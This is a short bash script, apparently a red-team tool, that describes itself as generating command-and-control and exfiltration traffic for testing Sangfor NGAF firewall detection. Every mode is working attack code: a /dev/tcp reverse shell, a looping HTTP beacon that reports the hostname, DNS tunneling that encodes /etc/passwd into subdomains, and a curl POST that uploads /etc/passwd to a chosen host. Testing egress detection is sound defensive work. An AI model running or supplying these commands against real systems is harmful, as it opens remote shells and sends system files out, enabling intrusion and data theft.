#!/bin/bash
# C2 / data-exfiltration egress generator — run INSIDE the target (or via a
# popped shell) to produce outbound traffic so Sangfor NGAF's C2 / egress
# detection can be tested. Point it at YOUR attacker/listener host.
#
# Usage:
#   c2-sim revshell     <host> <port>          reverse shell connect-back
#   c2-sim http-beacon  <host> <port>          periodic HTTP C2 beacon
#   c2-sim dns-tunnel   <dns-server> <domain>  DNS tunneling (data in subdomains)
#   c2-sim exfil        <host> <port>          exfil /etc/passwd over HTTP POST

MODE="$1"; HOST="$2"; ARG="$3"

usage() {
    echo "modes:"
    echo "  c2-sim revshell    <host> <port>"
    echo "  c2-sim http-beacon <host> <port>"
    echo "  c2-sim dns-tunnel  <dns-server> <domain>"
    echo "  c2-sim exfil       <host> <port>"
    exit 1
}

[ -z "$MODE" ] || [ -z "$HOST" ] && usage

case "$MODE" in
    revshell)
        echo "[c2] reverse shell -> $HOST:${ARG:-4444}"
        bash -i >& "/dev/tcp/$HOST/${ARG:-4444}" 0>&1
        ;;
    http-beacon)
        echo "[c2] HTTP beacon -> $HOST:${ARG:-80} (Ctrl+C to stop)"
        while true; do
            curl -s -A "Mozilla/5.0 (C2Beacon)" \
                "http://$HOST:${ARG:-80}/gate.php?id=$(hostname)&t=$(date +%s)" >/dev/null
            sleep 5
        done
        ;;
    dns-tunnel)
        echo "[c2] DNS tunneling via $HOST for domain ${ARG:-tunnel.evil.test}"
        for i in $(seq 1 20); do
            d=$(head -c 30 /etc/passwd | base32 -w0 2>/dev/null | tr -d '=' | tr 'A-Z' 'a-z')
            dig +short @"$HOST" "${d}.${ARG:-tunnel.evil.test}" TXT >/dev/null 2>&1
            sleep 1
        done
        echo "[c2] dns-tunnel done"
        ;;
    exfil)
        echo "[c2] exfil /etc/passwd -> $HOST:${ARG:-80}"
        curl -s -X POST --data-binary @/etc/passwd \
            "http://$HOST:${ARG:-80}/upload" >/dev/null && echo "[c2] sent /etc/passwd"
        ;;
    *)
        usage
        ;;
esac
